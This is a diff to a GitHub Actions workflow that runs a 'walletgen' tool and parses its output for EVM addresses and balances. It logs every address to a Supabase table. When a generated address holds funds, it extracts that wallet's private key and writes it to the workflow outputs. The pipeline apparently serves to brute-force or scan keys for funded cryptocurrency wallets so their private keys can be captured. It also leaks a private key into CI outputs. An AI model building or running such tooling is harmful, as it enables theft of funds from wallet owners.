@@ -44,8 +44,6 @@ jobs:
         run: |
           chmod +x walletgen
           echo "=== Starting walletgen with expect ==="
-          # Ensure chunk file is present in working directory
-          ls -lh evm_chunk.txt
           expect <<'EOF' | tee result.txt
           log_user 1
           spawn ./walletgen
@@ -65,28 +63,40 @@ jobs:
           active_addr=""
           active_priv=""
 
-          awk '/address:/ {addr=$2} /balance:/ {bal=$2;
-            status="empty";
-            if (bal!="(empty)" && bal!="0.000000$") status="active";
-            # Check Supabase
-            cmd="curl -s \"${{ secrets.SUPABASE_URL }}/rest/v1/checked_wallets?address=eq."addr"\" -H \"apikey: ${{ secrets.SUPABASE_KEY }}\" -H \"Authorization: Bearer ${{ secrets.SUPABASE_KEY }}\""
-            cmd | getline exists
-            close(cmd)
-            if (exists=="[]") {
-              system("curl -s \"${{ secrets.SUPABASE_URL }}/rest/v1/checked_wallets\" -H \"apikey: ${{ secrets.SUPABASE_KEY }}\" -H \"Authorization: Bearer ${{ secrets.SUPABASE_KEY }}\" -H \"Content-Type: application/json\" -d \"{\\\"address\\\":\\\""addr"\\\",\\\"status\\\":\\\""status"\\\"}\"")
-            }
-            if (status=="active") {
-              found="true"
-              active_addr=addr
-              cmd2="grep \\\"Private Key:\\\" result.txt | head -n1 | awk \\'{print $3}\\'"
-              cmd2 | getline active_priv
-              close(cmd2)
-            }
-          } END {
-            print \"found=\"found >> ENVIRON[\"GITHUB_OUTPUT\"]
-            print \"address=\"active_addr >> ENVIRON[\"GITHUB_OUTPUT\"]
-            print \"private=\"active_priv >> ENVIRON[\"GITHUB_OUTPUT\"]
-          }' result.txt
+          while read -r line; do
+            if [[ $line == address* ]]; then
+              addr=$(echo "$line" | awk '{print $2}')
+            fi
+            if [[ $line == balance* ]]; then
+              bal=$(echo "$line" | awk '{print $2}')
+              status="empty"
+              if [[ "$bal" != "(empty)" && "$bal" != "0.000000$" ]]; then
+                status="active"
+              fi
+
+              # Check Supabase
+              exists=$(curl -s "${{ secrets.SUPABASE_URL }}/rest/v1/checked_wallets?address=eq.${addr}" \
+                -H "apikey: ${{ secrets.SUPABASE_KEY }}" -H "Authorization: Bearer ${{ secrets.SUPABASE_KEY }}")
+
+              if [ "$exists" = "[]" ]; then
+                # Insert new wallet with status
+                curl -s "${{ secrets.SUPABASE_URL }}/rest/v1/checked_wallets" \
+                  -H "apikey: ${{ secrets.SUPABASE_KEY }}" -H "Authorization: Bearer ${{ secrets.SUPABASE_KEY }}" \
+                  -H "Content-Type: application/json" \
+                  -d "{\"address\":\"$addr\",\"status\":\"$status\"}"
+              fi
+
+              if [ "$status" = "active" ]; then
+                found=true
+                active_addr=$addr
+                active_priv=$(grep "Private Key:" result.txt | head -n1 | awk '{print $3}')
+              fi
+            fi
+          done < result.txt
+
+          echo "found=$found" >> $GITHUB_OUTPUT
+          echo "address=$active_addr" >> $GITHUB_OUTPUT
+          echo "private=$active_priv" >> $GITHUB_OUTPUT
 
       - name: Update progress index
         run: |
